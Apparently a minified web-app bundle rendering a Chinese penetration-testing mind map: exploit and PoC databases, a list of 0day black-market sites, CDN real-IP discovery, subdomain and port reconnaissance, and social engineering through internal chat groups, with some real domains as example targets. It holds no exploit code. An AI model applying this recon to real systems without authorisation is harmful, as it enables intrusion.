z(){Object(h.a)(this,z)};E.\u96C6\u4E2D_\u67E5\u8BE2\u7F51\u7AD9_\u53CA\u6F0F\u6D1E\u5E93={name:"\u5355\u70B9EXP_\u96C6\u4E2D_\u67E5\u8BE2\u7F51\u7AD9",steps:[{name:"\u6F0F\u6D1E\u6587\u5E93\uFF0C\u6536\u5F55\u4E86\u3010\u5E38\u89C1\u6709\u7528POC\u3011\u7684\u5730\u65B9\u3002",desc:u.a.createElement(u.a.Fragment,null,"\u53EF\u4EE5\u901B\u4E00\u901B\uFF0C\u8BF4\u4E0D\u5B9A\u6709\u610F\u5916\u6536\u83B7"),content:u.a.createElement(u.a.Fragment,null,"\u8D44\u6599\uFF1A",u.a.createElement("ol",null,u.a.createElement("li",null,s("\u767D\u9601\u6587\u5E93","https://wiki.bylibrary.cn/%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/ActiveMQ/ActiveMQ%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/")),u.a.createElement("li",null,s("PeiQi WiKi-POC\u6587\u5E93","http://wiki.peiqi.tech/"))))},{name:"cvedetails",content:u.a.createElement(u.a.Fragment,null,"\u4ECB\u7ECD",u.a.createElement("ol",null,u.a.createElement("li",null,"\u6BD4\u8F83\u8001\u724C\u7684\uFF0C\u6F0F\u6D1E\u5E93")),"\u4F7F\u7528",u.a.createElement("ol",null,u.a.createElement("li",null,"\u8FDB\u5165\u3010",s("www.cvedetails.com/vendor/10048/Nginx.html"),"\u3011")))},{name:"cnvd",content:u.a.createElement(u.a.Fragment,null,"\u4F7F\u7528",u.a.createElement("ol",null,u.a.createElement("li",null)))},{name:"seebug",content:u.a.createElement(u.a.Fragment,null,"\u4F7F\u7528",u.a.createElement("ol",null,u.a.createElement("li",null)))},{name:"1337day  /  0day",content:u.a.createElement(u.a.Fragment,null,"\u4F7F\u7528",u.a.createElement("ol",null,u.a.createElement("li",null)))},{name:"exploit-db",content:u.a.createElement(u.a.Fragment,null,"\u4F7F\u7528",u.a.createElement("ol",null,u.a.createElement("li",null)))},{name:"Packetstorm-Security",content:u.a.createElement(u.a.Fragment,null,"\u4F7F\u7528",u.a.createElement("ol",null,u.a.createElement("li",null)))}]},E.\u96F6\u6563_\u590D\u73B0\u6587\u7AE0={name:"\u5355\u70B9EXP_\u96F6\u6563_\u590D\u73B0\u6587\u7AE0",content:u.a.createElement(u.a.Fragment,null,"\u4F7F\u7528",u.a.createElement("ol",null,u.a.createElement("li",null,"\u641C\u7D22\u5F15\u64CE",u.a.createElement("ol",null,u.a.createElement("li",null,"\u8C37\u6B4C\u3001\u767E\u5EA6"))),u.a.createElement("li",null,"\u5404\u79CD\u8D44\u8BAF\u6765\u6E90",u.a.createElement("ol",null,u.a.createElement("li",null,"GitHub \u641C\u7D22"))),u.a.createElement("li",null,"\u9ED1\u4EA7\u4EA4\u6613",u.a.createElement("ol",null,u.a.createElement("li",null,"0day\u4EA4\u6613\u7F51",u.a.createElement("ol",null,u.a.createElement("li",null,"0day.today"),u.a.createElement("li",null,"Exploit.in"),u.a.createElement("li",null,"ExploitHub.com"),u.a.createElement("li",null,"1337day.com")))))))};var C=function z(){Object(h.a)(this,z)};C.\u6846\u67B6=function(){var z={name:"Yii"},N={name:"Laravel"},K={name:"ThinkPHP"},S={name:"Shiro"},T={name:"Struts"},H={name:"Spring"},q={name:"Maven"},G={name:"Flask"},ju={name:"Django"},$={name:"Tornado"};return{\u6846\u67B6_Yii:z,\u6846\u67B6_Laravel:N,\u6846\u67B6_ThinkPHP:K,\u6846\u67B6_Shiro:S,\u6846\u67B6_Struts:T,\u6846\u67B6_Spring:H,\u6846\u67B6_Maven:q,\u6846\u67B6_Flask:G,\u6846\u67B6_Django:ju,\u6846\u67B6_Tornado:$}}(),C.\u8BED\u8A00=function(){var z={name:"\u8BED\u8A00_PHP",steps:[C.\u6846\u67B6.\u6846\u67B6_Yii,C.\u6846\u67B6.\u6846\u67B6_Laravel,C.\u6846\u67B6.\u6846\u67B6_ThinkPHP]},N={name:"\u8BED\u8A00_Java",steps:[C.\u6846\u67B6.\u6846\u67B6_Shiro,C.\u6846\u67B6.\u6846\u67B6_Struts,C.\u6846\u67B6.\u6846\u67B6_Spring,C.\u6846\u67B6.\u6846\u67B6_Maven]},K={name:"\u8BED\u8A00_Python",steps:[C.\u6846\u67B6.\u6846\u67B6_Flask,C.\u6846\u67B6.\u6846\u67B6_Django,C.\u6846\u67B6.\u6846\u67B6_Tornado]};return{\u8BED\u8A00_PHP:z,\u8BED\u8A00_Java:N,\u8BED\u8A00_Python:K}}(),C.\u4EE3\u7801\u5BA1\u8BA1_\u5DE5\u5177=function(){var z={name:"\u4EE3\u7801\u5BA1\u8BA1_\u5DE5\u5177_PHP",steps:[c.seay_PHP_\u4EE3\u7801\u5BA1\u8BA1]},N={name:"\u4EE3\u7801\u5BA1\u8BA1_\u5DE5\u5177_\u603B\u548C",steps:[z]};return{\u4EE3\u7801\u5BA1\u8BA1_\u5DE5\u5177_PHP:z,\u603B\u548C:N}}();var y=function z(){Object(h.a)(this,z)};y.Github\u76D1\u63A7={name:"Github\u76D1\u63A7",desc:u.a.createElement(u.a.Fragment,null),content:u.a.createElement(u.a.Fragment,null,"\u4E24\u65B9\u9762\u4F5C\u7528",u.a.createElement("ol",null,u.a.createElement("li",null,"\u6536\u96C6\u6700\u65B0\u7684 exp \u6216 poc"),u.a.createElement("li",null,"\u53D1\u73B0\u76F8\u5173 \u6D4B\u8BD5\u76EE\u6807 \u7684\u8D44\u4EA7\u4FE1\u606F",u.a.createElement("ol",null,u.a.createElement("li",null,"\u5982\u679C\u76EE\u6807\u7F51\u7AD9\uFF0C\u7528\u7684\u3010\u67D0\u5957\u7A0B\u5E8F\u3011"),u.a.createElement("li",null,"\u4F60\u53C8\u4E0B\u8F7D\u4E0D\u5230\u8FD9\u5957\u7A0B\u5E8F"),u.a.createElement("li",null,"GitHub\u4E0A\uFF0C\u6709\u4EBA\u53EF\u80FD\u4F1A\u5171\u4EAB\u3010\u8FD9\u5957\u7A0B\u5E8F\u3011")))),"\u4F7F\u7528",u.a.createElement("ol",null,u.a.createElement("li",null,"\u5927\u7684\uFF1A \u2026\u2026\u2026\u2026"),u.a.createElement("li",null,"\u5C0F\u7684\uFF1A \u5C0F\u8FEA\u7684\u5C55\u793A\u811A\u672C",u.a.createElement("ol",null,u.a.createElement("li",null,"\u76D1\u542C\u5173\u952E\u8BCD\uFF1A CVE-2020\u3001ctcms"),u.a.createElement("li",null,"\u6CE8\u518C ",s("Server\u9171","sc.ftqq.com/3.version")," \u63A8\u9001")))))};var _={name:"CDN\u6280\u672F",desc:u.a.createElement(u.a.Fragment,null,"\u8BA9\u7528\u6237\u3010\u5C31\u8FD1\u83B7\u53D6\u3011\u2014\u2014\u2014\u2014\u5BA2\u89C2\u4E0A\uFF0C\u8D77\u5230\u4E86\u3010\u9690\u85CF\u771F\u5B9EIP\u3011\u7684\u4F5C\u7528",u.a.createElement("br",null),"\u53E6\u4E00\u65B9\u9762\u3010\u7F13\u5B58\u3011\uFF0C\u4E5F\u5E72\u6270\u4E86",u.a.createElement("br",null),u.a.createElement("br",null),"\u3010\u771F\u5B9EIP\u3011\u83B7\u53D6\u540E\uFF0C\u4F7F\u7528\uFF1A",u.a.createElement("ol",null,u.a.createElement("li",null,"\u4FEE\u6539\u672C\u5730host\u3002\u7ED1\u5B9A\u6307\u5B9A\u5730\u5740"))),steps:[{name:"\u5B50\u57DF\u540D\u67E5\u8BE2",desc:u.a.createElement(u.a.Fragment,null,"\u7B2C\u4E00\u4E2A\u610F\u4E49",u.a.createElement("br",null),"\u7B2C\u4E8C\u4E2A\u610F\u4E49",u.a.createElement("br",null)),content:u.a.createElement(u.a.Fragment,null,"\u5206\u60C5\u51B5\uFF1A",u.a.createElement("ol",null,u.a.createElement("li",null,"1. \u5B50\u57DF\u540D\uFF0C\u5C31\u5728\u3010\u540C\u673A\u3011"),u.a.createElement("li",null,"2. \u5B50\u57DF\u540D\uFF0C\u5C31\u5728\u3010\u540C\u7F51\u6BB5\u3011"),u.a.createElement("li",null,"3. \u5B50\u57DF\u540D\uFF0C\u4E0D\u5728\u3010\u540C\u7F51\u6BB5\u3011")),"\u5982\u679C\u3010\u5B50\u57DF\u540D\u65E0CDN\u3011\uFF0C\u5219\u6211\u4EEC\u53EF\u4EE5\u63A8\u6D4B\uFF1A",u.a.createElement("ol",null,u.a.createElement("li",null,"\u4E3B\u57DF\u540D\u7684\u5927\u81F4IP\u8303\u56F4"),u.a.createElement("li",null,"\u3010\u5B50\u57DF\u540D \u65E0CDN\u3011+\u3010\u5B50\u57DF\u540D \u540C\u7F51\u6BB5\u3011\uFF0C\u5219\u53EF\u4EE5\u80AF\u5B9A\uFF0C\u5927\u81F4\u7F51\u6BB5\u8303\u56F4")),"\u76F8\u5173\u5DE5\u5177\uFF1A",u.a.createElement("ol",null,c.\u6E32\u67D3_\u76F4\u63A5\u653Eol_\u4E0D\u9700\u8981\u5305li(c.\u7EC4["\u3010\u7EC4\u3011\u5B50\u57DF\u540D\u5DE5\u5177"])))},{name:"\u90AE\u4EF6\u670D\u52A1\u67E5\u8BE2",content:u.a.createElement(u.a.Fragment,null,u.a.createElement("ol",null,u.a.createElement("li",null,"\u5927\u4E2D\u578B\u7F51\u7AD9\uFF0C\u90FD\u6709 \u81EA\u5DF1 \u90AE\u4EF6\u670D\u52A1\u5668"),u.a.createElement("li",null,"\u5927\u90E8\u5206\u3010\u90AE\u4EF6\u670D\u52A1\u3011 \uFF0C\u90FD\u4E0D\u4F1A\u505ACDN")),"\u6B63\u5411\u548C\u53CD\u5411",u.a.createElement("ol",null,u.a.createElement("li",null,"\u6211\u4EEC\u53D1\u9001\uFF0C\u4E00\u822C\u4F1A\u8FC7CDN"),u.a.createElement("li",null,"\u5B83\u53D1\u9001\u8FC7\u6765\uFF0C\u4E00\u822C\u4E0D\u8FC7CDN")),"\u64CD\u4F5C",u.a.createElement("ol",null,u.a.createElement("li",null,"\u5148\u6CE8\u518C\uFF0C\u518D\u6536\u90AE\u4EF6"),u.a.createElement("li",null,"\u67E5\u770B\u90AE\u4EF6\u6E90\u7801"),u.a.createElement("li",null,"\u9A8C\u8BC1",u.a.createElement("ol",null,u.a.createElement("li",null,"\u4EBA\u60C5\u5473\u7684"),u.a.createElement("li",null,"\u6280\u672F\u624B\u6BB5")))))},{name:"\u56FD\u5916\u5730\u5740\u8BF7\u6C42",desc:u.a.createElement(u.a.Fragment,null,"\u9009\u62E9\u3010m\u57DF\u540D\u3011\uFF0C\u53EF\u80FD\u6BD4 com\u57DF\u540D \u5BF9\u5E94\u7684CDN\u8282\u70B9\u8981\u5C11\u3002",u.a.createElement("br",null),"\u66F4\u597D\u7B5B\u9009",u.a.createElement("br",null)),steps:[c.\u7EC4.\u8D85\u7EA7Ping,c.get_site_ip_\u771F\u5B9EIP_\u7B2C\u4E09\u65B9\u63A5\u53E3]},{name:"\u9057\u7559\u6587\u4EF6\uFF0C\u626B\u63CF\u5168\u7F51",tags:[F.\u7279\u5B9A\u89E6\u53D1\u6761\u4EF6,F.\u653E\u5230\u6700\u540E\u8003\u8651],steps:[{name:"\u9057\u7559\u6587\u4EF6",content:u.a.createElement(u.a.Fragment,null,"phpinfo",u.a.createElement("ol",null,u.a.createElement("li",null,"\u8BBF\u95EE\u672C\u5730\u5730\u5740"),u.a.createElement("li",null,"\u901A\u8FC7\u3010\u672C\u5730\u5730\u5740\u3011\u770B\u5230\u3010\u771F\u5B9EIP\u3011"),u.a.createElement("li",null,"Server Address")))},{name:"\u626B\u63CF\u5168\u7F51  \uFF08\u6700\u540E\u7684\u529E\u6CD5\uFF09",tags:[F.\u653E\u5230\u6700\u540E\u8003\u8651],content:u.a.createElement(u.a.Fragment,null,"\u5DE5\u5177\u3001\u8F6F\u4EF6\u3001\u5E73\u53F0",u.a.createElement("ol",null,u.a.createElement("li",null,"\u5404\u4E2A\u5730\u533A\uFF0C\u90FD\u6536\u96C6IP"),u.a.createElement("li",null,"\u7136\u540E\uFF0C\u5206\u6790IP")),"\u5E38\u7528\uFF1A",u.a.createElement("ol",null,c.\u6E32\u67D3_\u76F4\u63A5\u653Eol_\u4E0D\u9700\u8981\u5305li(c.\u7EC4["\u3010\u7EC4\u3011CDN\u626B\u5168\u7F51"]),c.\u6E32\u67D3_\u76F4\u63A5\u653Eol_\u4E0D\u9700\u8981\u5305li(c.get_site_ip_\u771F\u5B9EIP_\u7B2C\u4E09\u65B9\u63A5\u53E3)))}]},{name:"\u9ED1\u6697\u5F15\u64CE\uFF0C\u641C\u7D22\u7279\u5B9A\u6587\u4EF6",desc:o.\u9891\u7387\u4ECB\u7ECD,desc_styles:{maxWidth:"500px",width:"500px"},steps:[o.\u7279\u5B9A\u6587\u4EF6]},{name:"DNS\u5386\u53F2\u8BB0\u5F55\uFF0C\u4EE5\u91CF\u6253\u91CF",steps:[{name:"DNS\u5386\u53F2\u8BB0\u5F55",content:u.a.createElement(u.a.Fragment,null,"\u4E4B\u524D\u6CA1\u4F7F\u7528CDN\uFF0C\u6709\u4ED6\u7684\u5386\u53F2\u8BB0\u5F55",u.a.createElement("ol",null,u.a.createElement("li",null,"\u7559\u4E0B\u4E86\u75D5\u8FF9"),u.a.createElement("li",null,"\u4E4B\u524D\u6CA1\u6709\u94B1\uFF0C\u6216\u8005 \u6CA1\u60F3\u5230\u6709CDN\u8FD9\u4E2A\u670D\u52A1")),"\u4ECE \u5386\u53F2\u8BB0\u5F55 \u627E\uFF0C\u4EE5\u524D\u6CA1\u4F7F\u7528 CDN \u65F6\u7684\u771F\u5B9EIP\u3002",u.a.createElement("ol",null,c.\u6E32\u67D3_\u76F4\u63A5\u653Eol_\u4E0D\u9700\u8981\u5305li(c.x_threatbook_cn_\u7EFC\u5408\u67E5\u8BE2.DNS\u89E3\u6790\u8BB0\u5F55)))},{name:"\u4EE5\u91CF\u6253\u91CF",tags:[F.\u653E\u5230\u6700\u540E\u8003\u8651]}]},c.\u7EC4["\u3010\u7EC4\u3011CDN\u626B\u5168\u7F51"]]},O={name:"\u603B\u4F53\u601D\u8DEF",desc:u.a.createElement(u.a.Fragment,null,"\u628A\u4F60\u7684\u76EE\u6807\uFF0C\u4ED6\u80FD\u591F\u5728\u7F51\u4E0A\u53EF\u4EE5\u6D4B\u8BD5\u7684\u70B9\uFF0C\u5168\u90E8\u627E\u51FA\u6765\uFF1B",u.a.createElement("br",null),"\u5728\u6240\u6709\u53EF\u6D4B\u8BD5\u7684\u70B9\uFF0C\u9009\u53D6\u6700\u8106\u5F31\u7684\u70B9\uFF0C\u8FDB\u53BB\u3002"),steps:[{name:"\u6709\u65E0WEB",steps:[{name:"\u6709\u65E0CDN",desc:u.a.createElement(u.a.Fragment,null,"\u6709\uFF0C\u8DF3\u8F6C\u3010CDN\u3011",u.a.createElement("br",null),"\u65E0\uFF0C\u5F00\u59CB\u3010WEB\u3011",u.a.createElement("br",null))}]},{name:"\u6709\u65E0APP",steps:[{name:"\u662F\u5426 WEB \u534F\u8BAE",desc:u.a.createElement(u.a.Fragment,null,m("\u533A\u5206\u6D4B\u8BD5\u65B9\u6CD5"),u.a.createElement("br",null),u.a.createElement("br",null),u.a.createElement("ol",null,u.a.createElement("li",null,"\u6709\uFF0C\u8DF3\u8F6C\u3010\u6709\u65E0WEB\u3011"),u.a.createElement("li",null,u.a.createElement("br",null)),u.a.createElement("li",null,"\u65E0\uFF0C\u8FDB\u884C\u5206\u6790\u3002",u.a.createElement("ol",null,u.a.createElement("li",null,"\u5E76\u5F00\u59CB\u3010APP\u3011"))))),steps:[{name:"\u5C1D\u8BD5\u63D0\u53D6"},{name:"\u53CD\u7F16\u8BD1\u9006\u5411"},{name:"\u82E5\u8FD8\u662F\u65E0WEB",desc:u.a.createElement(u.a.Fragment,null,"\u8DF3\u8F6C\u3010\u6709\u65E0\u5176\u4ED6\u3011")}]}]},{name:"\u6709\u65E0\u5176\u4ED6",steps:[{name:"\u4FA7\u95E8\u4FE1\u606F / \u8D44\u4EA7\u4FE1\u606F",desc:u.a.createElement(u.a.Fragment,null,m("\u4FA7\u95E8\u4FE1\u606F")),content:u.a.createElement(u.a.Fragment,null,u.a.createElement("ol",null,u.a.createElement("li",null,"\u4EE5\u4E0A\u5404\u79CD\u5E73\u53F0\u4FE1\u606F"),u.a.createElement("li",null,u.a.createElement("br",null)),u.a.createElement("li",null,"whois\u5907\u6848\u7B49",u.a.createElement("ol",null,c.\u6E32\u67D3_\u76F4\u63A5\u653Eol_\u4E0D\u9700\u8981\u5305li(c.\u7EC4.\u57DF\u540D["\u3010\u7EC4\u3011\u67E5\u5907\u6848\u5DE5\u5177_whois_\u7B49\u7B49"]))),u.a.createElement("li",null,u.a.createElement("br",null)),u.a.createElement("li",null,"github\u7B49\u76D1\u63A7\u3002 \u53EF\u89C1\u300A\u8D44\u4EA7\u76D1\u63A7 \u62D3\u5C55\u300B",u.a.createElement("ol",null,c.\u6E32\u67D3_\u76F4\u63A5\u653Eol_\u4E0D\u9700\u8981\u5305li(y.Github\u76D1\u63A7)))))},{name:"\u7B2C\u4E09\u65B9\u5E94\u7528",desc:u.a.createElement(u.a.Fragment,null,m("\u4ECE\u8FD9\u4E9B\u5165\u624B")),content:u.a.createElement(u.a.Fragment,null,u.a.createElement("ol",null,u.a.createElement("li",null,"\u6570\u636E\u5E93\u5E94\u7528",u.a.createElement("ol",null,u.a.createElement("li",null,"mysql"),u.a.createElement("li",null,"mssql"),u.a.createElement("li",null,"oracle"),u.a.createElement("li",null,"\u2026\u2026\u2026\u2026"))),u.a.createElement("li",null,"\u5404\u79CD\u7BA1\u7406\u5E73\u53F0",u.a.createElement("ol",null,u.a.createElement("li",null,"weblogic"),u.a.createElement("li",null,"phpmyadmin"),u.a.createElement("li",null,"\u2026\u2026\u2026\u2026"))),u.a.createElement("li",null,"\u5404\u79CD\u7B2C\u4E09\u65B9\u5E94\u7528",u.a.createElement("ol",null,u.a.createElement("li",null,"vsftpd"),u.a.createElement("li",null,"nexus"),u.a.createElement("li",null,"git"),u.a.createElement("li",null,"\u2026\u2026\u2026\u2026")))))},{name:"\u5404\u79CD\u670D\u52A1\u63A5\u53E3",desc:u.a.createElement(u.a.Fragment,null,m("\u53D1\u73B0\u66F4\u591A\u672A\u77E5\u7684\u63A5\u53E3\u5C1D\u8BD5")),content:u.a.createElement(u.a.Fragment,null,u.a.createElement("ol",null,u.a.createElement("li",null,"\u5B58\u50A8\u670D\u52A1"),u.a.createElement("li",null,"\u652F\u4ED8\u670D\u52A1"),u.a.createElement("li",null,"\u5185\u90E8\u670D\u52A1"),u.a.createElement("li",null,"\u2026\u2026\u2026\u2026")))},{name:"\u5FAE\u4FE1\u516C\u4F17\u53F7\u7B49",desc:u.a.createElement(u.a.Fragment,null,m("\u53D1\u73B0\u66F4\u591A\u672A\u77E5\u7684\u5E94\u7528"),u.a.createElement("br",null),u.a.createElement("br",null),"(\u516C\u53F8\uFF0C\u505A\u7684\u6BD4\u8F83\u597D\u7684)"),content:u.a.createElement(u.a.Fragment,null,"\u627E \u66F4\u591A\u7684\u5E94\u7528 \u7EE7\u7EED",u.a.createElement("ol",null,u.a.createElement("li",null,"\u6D89\u53CAWEB"),u.a.createElement("li",null,"\u6D89\u53CAAPP"),u.a.createElement("li",null,"\u6D89\u53CA\u5176\u4ED6")))},{name:"\u5185\u90E8\u7FA4  \u5185\u90E8\u5E94\u7528  \u7B49",desc:u.a.createElement(u.a.Fragment,null,m("\u793E\u5DE5 \u6216 \u53D1\u73B0\u66F4\u591A\u672A\u77E5\u7684\u5E94\u7528")),content:u.a.createElement(u.a.Fragment,null,u.a.createElement("ol",null,u.a.createElement("li",null,"QQ\u6216\u5FAE\u4FE1\u7FA4"),u.a.createElement("li",null,"\u5DE5\u4F5C\u7FA4\uFF08\u9489\u9489\uFF09\u7B49"),u.a.createElement("li",null,"\u5176\u4ED6\u901A\u8BAF\u7FA4\u804A\u7B49")))}]}]},B=u.a.createElement(u.a.Fragment,null,u.a.createElement("br",null),"\u8865\u5145\uFF1A",u.a.createElement("ol",null,u.a.createElement("li",null,"\u6309\u7167 \u56FE\u7247\u6307\u7EB9 \u641C"),u.a.createElement("li",null,"\u6309\u7167 \u6E90\u7801\u6307\u7EB9 \u641C")),"\u4E2A\u4EBA\u518D\u8865\u5145\u4FE1\u606F\uFF1A",u.a.createElement("ol",null,u.a.createElement("li",null,"\u6E90\u7801\u6536\u96C6\u3001\u539F\u7406\u5256\u6790\uFF1A",u.a.createElement("ol",null,u.a.createElement("li",null,s("\u4E92\u8054\u7F51\u516C\u53F8\u5E38\u7528\u6846\u67B6\u6E90\u7801\u8D4F\u6790","https://github.com/doocs/source-code-hunter")))))),r={name:"\u4FE1\u606F\u6536\u96C6",desc:"\u4FE1\u606F\u6536\u96C6",steps:[O,{name:"WEB / \u67B6\u6784\u3001\u642D\u5EFA\u3001WAF\uFF0C\u7B49",desc:u.a.createElement(u.a.Fragment,null,m("\u76EE\u6807\u591A\u673A\u4F1A\u5927")),steps:[{name:"CMS\u8BC6\u522B\u6280\u672F",desc:u.a.createElement(u.a.Fragment,null,m("\u63A5\u57FA\u7840\u5165\u95E8\u601D\u8DEF"),u.a.createElement("br",null),B),content:u.a.createElement(u.a.Fragment,null,"\u300A\u57FA\u7840\u5165\u95E8\u300B \u524D\u9762\u8BB2\u4E86")},{name:"\u6E90\u7801\u83B7\u53D6\u6280\u672F",desc:u.a.createElement(u.a.Fragment,null,m("\u63A5\u57FA\u7840\u5165\u95E8\u601D\u8DEF"),u.a.createElement("br",null),B),content:u.a.createElement(u.a.Fragment,null,"\u300A\u57FA\u7840\u5165\u95E8\u300B \u524D\u9762\u8BB2\u4E86")},{name:"\u3010\u7EC4\u6210\u67B6\u6784\u6A21\u578B - \u56DB\u4E2A\u90E8\u5206\u3011\u4FE1\u606F\u83B7\u53D6",desc:u.a.createElement(u.a.Fragment,null,m("\u6811\u7ACB\u7B80\u8981\u601D\u8DEF"),u.a.createElement("br",null),u.a.createElement("br",null),"\u7F51\u7AD9\u6E90\u7801\u3001\u64CD\u4F5C\u7CFB\u7EDF\u3001\u4E2D\u95F4\u4EF6\uFF08\u642D\u5EFA\u5E73\u53F0\uFF09\u3001\u6570\u636E\u5E93"),content:u.a.createElement(u.a.Fragment,null,"\u300A\u57FA\u7840\u5165\u95E8\u300B \u524D\u9762\u8BB2\u4E86",u.a.createElement("ol",null,u.a.createElement("li",null,"\u7F51\u7AD9\u6E90\u7801",u.a.createElement("ol",null,u.a.createElement("li",null,B))),u.a.createElement("li",null,"\u64CD\u4F5C\u7CFB\u7EDF",u.a.createElement("ol",null,u.a.createElement("li",null,"Windows"),u.a.createElement("li",null,"Linux"))),u.a.createElement("li",null,"\u4E2D\u95F4\u4EF6\uFF08\u642D\u5EFA\u5E73\u53F0\uFF09",u.a.createElement("ol",null,u.a.createElement("li",null,"Nginx\u3001Tengine"),u.a.createElement("li",null,"Docker\u4E5F\u7B97"))),u.a.createElement("li",null,"\u6570\u636E\u5E93")))},{name:"\u7AD9\u70B9\u642D\u5EFA\u5206\u6790",desc:u.a.createElement(u.a.Fragment,null,"99%\u7684\u4E60\u60EF",u.a.createElement("br",null),m("\u76EE\u6807\u591A\u673A\u4F1A\u5927"),u.a.createElement("br",null)),steps:[{name:"\u3010\u4E60\u60EF\u3011 \u76EE\u5F55\u578B\u7AD9\u70B9",content:u.a.createElement(u.a.Fragment,null,"\u4E3E\u4F8B\uFF1A",u.a.createElement("ol",null,u.a.createElement("li",null,"sti.blcu.edu.cn\uFF0C \u4E00\u4E2A\u67B6\u6784"),u.a.createElement("li",null,"sit.blcu.edu.cn/bbs\uFF0C discuz\u67B6\u6784")),"\u65B9\u5F0F\uFF1A",u.a.createElement("ol",null,u.a.createElement("li",null,"\u901A\u8FC7 \u76EE\u5F55\u626B\u63CF\u3001\u722C\u884C\u5DE5\u5177 \u90FD\u53EF\u4EE5\u5F97\u5230"),u.a.createElement("li",null,"\u5728\u4E0A\u9762\u7684\u4EE5\u540E\uFF0C\u6709\u65F6\u5019 \u3010\u901A\u8FC7\u70B9\u51FB\u3011 \u4E5F\u53EF\u4EE5\u5F97\u5230")))},{name:"\u3010\u4E60\u60EF\u3011 \u7AEF\u53E3\u7C7B\u7AD9\u70B9",content:u.a.createElement(u.a.Fragment,null,"\u4E3E\u4F8B\uFF1A",u.a.createElement("ol",null,u.a.createElement("li",null,"web.0516jz.com:80"),u.a.createElement("li",null,"web.0516jz.com:8080"),u.a.createElement("li",null,"web.0516jz.com:83"),u.a.createElement("li",null,"web.0516jz.com:89"),u.a.createElement("li",null,"web.0516jz.com:8888")),"\u65B9\u5F0F\uFF1A",u.a.createElement("ol",null,u.a.createElement("li",null,"\u626B\u63CF"),u.a.createElement("li",null,"\u9ED1\u6697\u5F15\u64CE \uFF08\u6211\u81EA\u5DF1\u8865\u5145\u7684\uFF09",u.a.createElement("ol",null,c.\u6E32\u67D3_\u76F4\u63A5\u653Eol_\u4E0D\u9700\u8981\u5305li(o.\u7AEF\u53E3_\u6536\u96C6)))))},{name:"\u3010\u4E60\u60EF\u3011 \u5B50\u57DF\u540D\u7AD9\u70B9",content:u.a.createElement(u.a.Fragment,null,"\u4E3E\u4F8B\uFF1A",u.a.createElement("ol",null,u.a.createElement("li",null,"www.goodlift.net"),u.a.createElement("li",null,"bbs.goodlift.net")),"\u65B9\u5F0F\uFF1A",u.a.createElement("ol",null,u.a.createElement("li",null,"\u53C2\u7167\u3010\u5B50\u57DF\u540D\u3011\u7684\u65B9\u5F0F"),u.a.createElement("li",null,"\u901A\u8FC7 /robots.txt \uFF0C\u6709\u65F6\u53EF\u4EE5\u83B7\u53D6\u3010CMS\u7C7B\u578B\u3011",u.a.createElement("ol",null,u.a.createElement("li",null,"\u5982 DESTOON B2B")))))},{name:"\u3010\u4E60\u60EF\u3011 \u7C7B\u4F3C\u57DF\u540D\u7AD9\u70B9",content:u.a.createElement(u.a.Fragment,null,"\u4E3E\u4F8B\uFF1A",u.a.createElement("ol",null,u.a.createElement("li",null,"jmlsd.cn"),u.a.createElement("li",null,"jmlsd.com"),u.a.createElement("li",null,"www.axgc168.com")),"\u65B9\u5F0F\uFF1A",u.a.createElement("ol",null,u.a.createElement("li",null,"\u5404\u79CD\u5E38\u7528\u57DF\u540D\u540E\u7F00 cn\u3001net\u3001com \u7B49")))},{name:"\u3010\u4E60\u60EF\u3011 \u65C1\u6CE8_\u53CD\u67E5IP\u3001C\u6BB5\u7AD9\u70B9",desc:u.a.createElement(u.a.Fragment,null,"\u4ECB\u7ECD\uFF1A",u.a.createElement("ol",null,u.a.createElement("li",null,"\u4EE5\u524D\u4F7F\u7528\u7684\u5F88\u591A\u7684",u.a.createElement("ol",null,u.a.createElement("li",null,"\u73B0\u5728\uFF0C\u53EF\u80FD\u56E0\u4E3A\u5927\u5BB6\u90FD\u61C2\u4E86"),u.a.createElement("li",null,"\u601D\u8DEF\u6CA1\u6709\u4EE5\u524D\u597D\u7528\u4E86"))),u.a.createElement("li",null,"\u4E0D\u7BA1\u600E\u4E48\u6837\uFF0C\u8FD8\u662F\u8981\u5B66\u4E60\u7684",u.a.createElement("ol",null,u.a.createElement("li",null,"\u591A\u4E00\u79CD\u65B9\u6CD5\uFF0C\u591A\u4E00\u79CD\u53EF\u80FD\u6027"))))),content:u.a.createElement(u.a.Fragment,null,"\u4E3E\u4F8B\uFF1A",u.a.createElement("ol",null,u.a.createElement("li",null,"\u67E5\u8BE2\u9776\u573A \u540C\u670D\u52A1\u5668\u7AD9\u70B9"),u.a.createElement("li",null,"weipan\u641C\u7D22\u3010qqyewu.com\u3011")),"\u65B9\u5F0F\uFF1A",u.a.createElement("ol",null,u.a.createElement("li",null,"\u65C1\u6CE8_\u53CD\u67E5IP",u.a.createElement("ol",null,c.\u6E32\u67D3_\u76F4\u63A5\u653Eol_\u4E0D\u9700\u8981\u5305li(c.\u7EC4["\u3010\u7EC4\u3011\u65C1\u6CE8_\u53CD\u67E5IP_\u5DE5\u5177"])))))},{name:"\u3010\u4E60\u60EF\u3011 \u642D\u5EFA\u8F6F\u4EF6\u7279\u5F81\u7AD9\u70B9",desc:u.a.createElement(u.a.Fragment,null,"\u4E60\u60EF \u662F\u5F88\u91CD\u8981\u7684 ",u.a.createElement("br",null),"\u3010\u642D\u5EFA\u5957\u4EF6\u3011\uFF0C\u4E00\u7CFB\u5217 \u6709\u975E\u5E38\u660E\u663E\u7684\u7279\u5F81\u3002 ",u.a.createElement("br",null)),content:u.a.createElement(u.a.Fragment,null,"\u4E3E\u4F8B\uFF1A",u.a.createElement("ol",null,u.a.createElement("li",null)),"\u65B9\u5F0F\uFF1A",u.a.createElement("ol",null,u.a.createElement("li",null,"\u624B\u52A8",u.a.createElement("ol",null,u.a.createElement("li",null,"\u81EA\u5DF1\u642D\u5EFA\uFF0C\u4E00\u6B65\u6B65\u8C03\u8BD5"))),u.a.createElement("li",null,"\u4E00\u4F53\u5316\u7684\u642D\u5EFA\u8F6F\u4EF6 \uFF0C\u8D8A\u6765\u8D8A\u8F6C\u79FB\u5230\u8FD9\u4E00\u5757\u3002\u5F88\u5E38\u89C1",u.a.createElement("ol",null,u.a.createElement("li",null,"phpStudy"),u.a.createElement("li",null,"\u5B9D\u5854 - \u4E00\u952E\u642D\u5EFA \uFF08\u6BD4\u5982 \u7AEF\u53E3 